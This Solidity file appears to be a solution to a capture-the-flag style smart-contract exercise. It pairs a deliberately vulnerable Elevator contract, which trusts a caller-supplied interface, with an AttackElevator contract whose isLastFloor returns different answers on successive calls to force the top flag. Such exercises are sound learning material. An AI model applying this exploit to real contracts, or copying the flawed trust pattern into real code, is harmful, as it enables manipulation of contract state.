// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackElevator is Building {
    Elevator elevator;
    bool public called;
    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    function climbElevator() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint floor) external override returns(bool) {
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }

}